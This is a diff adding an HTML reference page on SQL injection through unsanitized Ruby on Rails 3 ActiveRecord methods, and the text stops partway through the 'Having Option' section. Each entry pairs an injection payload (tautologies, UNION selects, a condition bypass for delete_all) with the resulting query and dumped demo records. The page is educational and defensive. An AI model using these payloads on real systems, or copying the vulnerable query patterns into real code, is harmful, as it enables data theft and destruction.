@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Rails SQL Injection Examples</title>
+  <link href="/assets/application-c0a33cefdeb4bac063329da7f0eee7d0.css" media="all" rel="stylesheet" type="text/css" />
+  <script src="/assets/application-5590d2132eb2452c01cc8a5d92358661.js" type="text/javascript"></script>
+  <meta content="authenticity_token" name="csrf-param" />
+<meta content="a3G8BaQOnuF3x2+F/M0szhXUbzLtvkVA1LmItc7jx/I=" name="csrf-token" />
+</head>
+<body>
+  <div class="navbar navbar-fixed-top">
+    <div class="navbar-inner">
+      <div class="container">
+        <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </a>
+        <a class="brand" href="#">Rails SQL Injection</a>
+        <div class="nav-collapse">
+          <ul class="nav">
+          <select onchange="window.scrollTo(0, $(this.value).offset().top - 50)" style="margin-top: 5px; margin-bottom: 0px;">
+              <option value="#overview">Overview</option>
+              <option value="#calculate">Calculate Methods</option>
+              <option value="#delete_all">Delete All Method</option>
+              <option value="#destroy_all">Destroy All Method</option>
+              <option value="#exists">Exists? Method</option>
+              <option value="#find">Find Methods</option>
+              <option value="#from_option">From Option</option>
+              <option value="#group_option">Group Option</option>
+              <option value="#having">Having Method</option>
+              <option value="#having_option">Having Option</option>
+              <option value="#joins">Joins Method</option>
+              <option value="#lock">Lock Method and Option</option>
+              <option value="#order">Order Method</option>
+              <option value="#order_option">Order Option</option>
+              <option value="#pluck">Pluck Method</option>
+              <option value="#reorder">Reorder Method</option>
+              <option value="#select_option">Select Option</option>
+              <option value="#where">Where Method</option>
+              <option value="#update_all_order_option">Update All Order Option</option>
+          </select>
+        </ul>
+        </div>
+        <span class="pull-right" style="padding-top: 9px">
+          Rails 3 |
+          <a href="/rails4">Rails 4</a> |
+          <a href="#resources">More Resources</a>
+        </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="container">
+    <h2 id="overview">Overview</h2>
+<p>
+The <a href="http://rubyonrails.org/">Ruby on Rails</a> web framework provides a library called <a href="http://guides.rubyonrails.org/active_record_querying.html">ActiveRecord</a> which provides an abstraction for accessing databases.
+</p>
+<p>
+This page lists many query methods and options in ActiveRecord which do not sanitize raw SQL arguments and are not intended to be called with unsafe user input. Careless use of these methods can open up code to <a href="https://owasp.org/index.php/SQL_Injection">SQL Injection</a> exploits. The examples here do not include SQL injection from known CVEs and are not vulnerabilites themselves, only potential misuses of the methods.
+</p>
+<p>
+Please use this list as a guide of what <em>not</em> to do.
+</p>
+<p>
+This list is in no way exhaustive or complete! Please feel free to <a href="https://github.com/presidentbeef/inject-some-sql">contribute</a>.
+</p>
+<h3>Examples</h3>
+<p>
+Each method or option described below is accompanied by an example demonstrating how the ActiveRecord interface could be exploited if used unsafely. These are not necessarily the <em>worst</em> exploits, they represent just a small hint of what could be accomplished if one is not careful. The examples on this page were tested with Rails 3.2.22 and SQLite 3.
+</p>
+<h3>Interactive Version</h3>
+<p>
+Clone and run this site from <a href="https://github.com/presidentbeef/inject-some-sql">the git repo</a> to try out or modify the examples!
+</p>
+<table class="table">
+  <tr>
+    <td>
+      <div id="calculate">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/Calculations.html#method-i-calculate">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Calculate Methods</h3>
+
+  <div>
+    <p>There are several methods based around <code>ActiveRecord::Calculations#calculate</code>.</p>
+
+<p><code>calculate</code> takes an operation, a column name, and an options hash similar to <code>ActiveRecord::FinderMethods#find</code>. Methods based on <code>calculate</code> are shortcuts for different operations, and take a column name and options hash as arguments.</p>
+
+<p>In addition to the vulnerable options listed for <code>find</code>, the column name argument can also accept SQL!</p>
+
+<p>Calculation methods:</p>
+
+<ul>
+<li>average</li>
+<li>calculate</li>
+<li>count</li>
+<li>maximum</li>
+<li>minimum</li>
+<li>sum</li>
+</ul>
+
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>This example finds the age of a specific user, rather than the sum of all user ages.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:column</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">age) FROM users WHERE name = 'Bob';</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">Order</span>.calculate(<span style="color:#A60">:sum</span>, params[<span style="color:#A60">:column</span>])</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="color:#369;font-weight:bold">SUM</span>(age) <span style="color:#080;font-weight:bold">FROM</span> users <span style="color:#080;font-weight:bold">WHERE</span> name = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">Bob</span><span style="color:#710">'</span></span>;) <span style="color:#080;font-weight:bold">AS</span> sum_id <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span> </span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      68
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="delete_all">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/Relation.html#method-i-delete_all">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Delete All Method</h3>
+
+  <div>
+    <p>Any methods which delete records should be used with care!</p>
+
+<p>The <code>delete_all</code> method takes the same kind of conditions arguments as <code>find</code>.
+The argument can be a string, an array, or a hash of conditions. Strings will not
+be escaped at all. Use an array or hash to safely parameterize arguments.</p>
+
+<p>Never pass user input directly to <code>delete_all</code>.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>This example bypasses any conditions and deletes all users.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:id</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">1) OR 1=1--</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.delete_all(<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">id = </span><span style="background-color:hsla(0,0%,0%,0.07);color:black"><span style="font-weight:bold;color:#666">#{</span>params[<span style="color:#A60">:id</span>]<span style="font-weight:bold;color:#666">}</span></span><span style="color:#710">&quot;</span></span>)</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">DELETE</span> <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span> <span style="color:#080;font-weight:bold">WHERE</span> (id = <span style="color:#00D">1</span>) <span style="color:#080;font-weight:bold">OR</span> <span style="color:#00D">1</span>=<span style="color:#00D">1</span><span style="color:#777">--)</span></span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      6
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="destroy_all">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/Relation.html#method-i-destroy_all">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Destroy All Method</h3>
+
+  <div>
+    <p>Any methods which delete records should be used with lots of caution! <code>destroy_all</code> is only slightly safer
+than <code>delete_all</code> since it will invoke callbacks associated with the model.</p>
+
+<p>The <code>destroy_all</code> method takes the same kind of conditions arguments as <code>find</code>.
+The argument can be a string, an array, or a hash of conditions. Strings will not
+be escaped at all. Use an array or hash to safely parameterize arguments.</p>
+
+<p>Never pass user input directly to <code>destroy_all</code>.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>This example bypasses any conditions and deletes all users.</p>
+
+<p>Because ActiveRecord needs to insantiate each object, this query is performed in a transaction.
+The SQL for selecting the records to delete (where the injection occurs) looks like this:</p>
+
+<p><span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span> <span style="color:#080;font-weight:bold">WHERE</span> (id = <span style="color:#069">NULL</span> <span style="color:#080;font-weight:bold">AND</span> admin = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#710">'</span></span>) <span style="color:#080;font-weight:bold">OR</span> <span style="color:#00D">1</span>=<span style="color:#00D">1</span><span style="color:#777">--')</span></span></p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:admin</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">') OR 1=1--'</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.destroy_all([<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">id = ? AND admin = '</span><span style="background-color:hsla(0,0%,0%,0.07);color:black"><span style="font-weight:bold;color:#666">#{</span>params[<span style="color:#A60">:admin</span>]<span style="font-weight:bold;color:#666">}</span></span><span style="color:#710">&quot;</span></span>, params[<span style="color:#A60">:id</span>]])</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">commit</span> <span style="color:#339;font-weight:bold">transaction</span></span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      [#&lt;User id: 13, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 64, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 14, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 58, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 15, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 26, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 16, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 72, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 17, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 54, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 18, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 76, admin: true, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;]
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="exists">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/FinderMethods.html#method-i-exists-3F">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Exists? Method</h3>
+
+  <div>
+    <p>The <code>exists?</code> method is used to check if a given record exists. The argument is usually a primary key. If the argument is a string, it will be escaped. If the argument is an array or hash, it will be treated like a conditions option.</p>
+
+<p><em>However</em>, code like this is <em>not safe</em>:</p>
+
+<pre>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.exists? params[<span style="color:#A60">:user</span>]</span>
+</pre>
+
+
+<p>Since Rails will automatically convert parameters to arrays or hashes, it is possible to inject any SQL into this query.</p>
+
+<p>For example,</p>
+
+<p><code>?user[]=1</code></p>
+
+<p>Will generate the query</p>
+
+<pre>
+<span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span>  <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">AS</span> one <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> (<span style="color:#00D">1</span>) LIMIT <span style="color:#00D">1</span></span>
+</pre>
+
+
+<p>This query will always return true. To be be safe, convert user input to a string or integer if using it as the primary key in <code>exists?</code>.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>This is more obvious than the example above, but demonstrates checking another table for a given value.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:user</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">') or (SELECT 1 FROM 'orders' WHERE total &gt; 1)--</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.exists? [<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">name = '</span><span style="background-color:hsla(0,0%,0%,0.07);color:black"><span style="font-weight:bold;color:#666">#{</span>params[<span style="color:#A60">:user</span>]<span style="font-weight:bold;color:#666">}</span></span><span style="color:#D20">'</span><span style="color:#710">&quot;</span></span>]</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span>  <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">AS</span> one <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> (name = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#710">'</span></span>) <span style="color:#080;font-weight:bold">or</span> (<span style="color:#B06;font-weight:bold">SELECT</span> <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">orders</span><span style="color:#710">'</span></span> <span style="color:#080;font-weight:bold">WHERE</span> total &gt; <span style="color:#00D">1</span>)<span style="color:#777">--') LIMIT 1</span></span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      true
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="find">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/FinderMethods.html#method-i-find">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Find Methods</h3>
+
+  <div>
+    <p><em>This method was deprecated in Rails 4.0 and removed in Rails 4.1.</em></p>
+
+<p>The <code>find</code> method is a very general and commonly-used query method. The first argument to <code>find</code> is either an integer ID, <code>:all</code>, <code>:first</code>, or <code>:last</code>. The last argument is an options hash. The options accepted by <code>find</code> are often used in other methods as well.</p>
+
+<p>The first argument to <code>find</code> <em>will</em> be escaped.</p>
+
+<p>Options:</p>
+
+<ul>
+<li><code>:conditions</code> - Can be a string, an array, or a hash. If a string, it will be passed to the database unchanged. If an array, the first element is a string and the remaining elements are values to interpolate into the string. The values will be sanitized, but the string element will not. If a hash is given, the keys and values will be properly sanitized.</li>
+<li><code>:order</code> - Unsanitized SQL string for <code>ORDER BY</code> clause.</li>
+<li><code>:group</code> - Unsanitized SQL string for <code>GROUP BY</code> clause.</li>
+<li><code>:having</code> - Unsanitized SQL string for <code>HAVING</code> clause.</li>
+<li><code>:limit</code> - Will be converted to an integer.</li>
+<li><code>:offset</code> - Will be converted to an integer.</li>
+<li><code>:joins</code> - Accepts SQL string, which is not sanitized. Also accepts named associations or an array containing both strings and named associations.</li>
+<li><code>:include</code> - Only accepts named associations.</li>
+<li><code>:select</code> - Unsanitized SQL string <code>SELECT</code> clause.</li>
+<li><code>:from</code> - Unsanitized SQL string.</li>
+<li><code>:readonly</code> - Boolean value</li>
+<li><code>:lock</code> - Unsanitized SQL string. May be ignored in databases that do not support locks. Also accepts a boolean.</li>
+</ul>
+
+
+<p>The <code>all</code>, <code>first</code>, <code>last</code>, <code>exists</code>, <code>where</code>, <code>calculate</code>, <code>update_all</code> and other methods accept these options or a subset.</p>
+
+<p>For more information, see <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/Base.html">the ActiveRecord docs</a>.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>This is just a tiny example of what can be done with interpolation in conditions. Here we return the first user with the admin flag set.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:name</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">name=') OR admin = 't' --</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.find(<span style="color:#A60">:first</span>, <span style="color:#A60">:conditions</span> =&gt; <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">name = '</span><span style="background-color:hsla(0,0%,0%,0.07);color:black"><span style="font-weight:bold;color:#666">#{</span>params[<span style="color:#A60">:name</span>]<span style="font-weight:bold;color:#666">}</span></span><span style="color:#D20">'</span><span style="color:#710">&quot;</span></span>)</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span>  <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> (name = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">name=</span><span style="color:#710">'</span></span>) <span style="color:#080;font-weight:bold">OR</span> admin = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">t</span><span style="color:#710">'</span></span> <span style="color:#777">--') LIMIT 1</span></span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      #&lt;User id: 30, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 59, admin: true, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="from_option">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/FinderMethods.html#method-i-find">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>From Option</h3>
+
+  <div>
+    <p>The <code>:from</code> option, used in any method that accepts <code>find</code>-style query options, does not escape its input.</p>
+
+<p>User input in <code>:from</code> options is likely rare.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>Instead of returning all non-admin users, we return all admin users.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:from</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users WHERE admin = 't';</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.all(<span style="color:#A60">:from</span> =&gt; params[<span style="color:#A60">:from</span>], <span style="color:#A60">:conditions</span> =&gt; { <span style="color:#A60">:admin</span> =&gt; <span style="color:#A60">:false</span> })</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> users <span style="color:#080;font-weight:bold">WHERE</span> admin = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">t</span><span style="color:#710">'</span></span>;  <span style="color:#080;font-weight:bold">WHERE</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">admin</span><span style="color:#710">&quot;</span></span> = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">false</span><span style="color:#710">'</span></span></span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      [#&lt;User id: 36, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 44, admin: true, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;]
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="group_option">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/FinderMethods.html#method-i-find">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Group Option</h3>
+
+  <div>
+    <p>The <code>:group</code> option for queries is unescaped.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>The intent of this query is to group non-admin users by the specified column. Instead, the query returns all users.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:group</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">name UNION SELECT * FROM users</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.find(<span style="color:#A60">:all</span>, <span style="color:#A60">:group</span> =&gt; params[<span style="color:#A60">:group</span>], <span style="color:#A60">:conditions</span> =&gt; { <span style="color:#A60">:admin</span> =&gt; <span style="color:#069">false</span> })</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">admin</span><span style="color:#710">&quot;</span></span> = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">f</span><span style="color:#710">'</span></span> <span style="color:#080;font-weight:bold">GROUP</span> <span style="color:#080;font-weight:bold">BY</span> name <span style="color:#080;font-weight:bold">UNION</span> <span style="color:#B06;font-weight:bold">SELECT</span> * <span style="color:#080;font-weight:bold">FROM</span> users</span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      [#&lt;User id: 37, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 45, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 38, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 24, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 39, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 38, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 40, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 70, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 41, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 63, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 42, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 59, admin: true, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;]
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="having">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/QueryMethods.html#method-i-from">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Having Method</h3>
+
+  <div>
+    <p>The <code>having</code> method does not escape its input and is easy to use for SQL injection since it tends to be at the end of a query.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>This input injects a union in order to return all orders, instead of just the orders from a single user.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:total</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">1 UNION SELECT * FROM orders</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">Order</span>.where(<span style="color:#A60">:user_id</span> =&gt; <span style="color:#00D">1</span>).group(<span style="color:#A60">:user_id</span>).having(<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">total &gt; </span><span style="background-color:hsla(0,0%,0%,0.07);color:black"><span style="font-weight:bold;color:#666">#{</span>params[<span style="color:#A60">:total</span>]<span style="font-weight:bold;color:#666">}</span></span><span style="color:#710">&quot;</span></span>)</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">user_id</span><span style="color:#710">&quot;</span></span> = <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">GROUP</span> <span style="color:#080;font-weight:bold">BY</span> user_id <span style="color:#080;font-weight:bold">HAVING</span> total &gt; <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">UNION</span> <span style="color:#B06;font-weight:bold">SELECT</span> * <span style="color:#080;font-weight:bold">FROM</span> orders</span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      [#&lt;Order id: 22, user_id: 1, total: 10, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;Order id: 23, user_id: 3, total: 500, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;Order id: 24, user_id: 4, total: 1, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;]
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="having_option">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/FinderMethods.html#method-i-find">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Having Option</h3>
+
+  <div>
+    <p>Like the method, the <code>:having</code> option does not escape its input and is easy to use for SQL injection since it tends to be at the end of a query.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>This input injects a union in order to return all orders, instead of just the orders from a single user.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:total</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">1 UNION SELECT * FROM orders</span><span style="color:#710">&quot;</span></span></span>
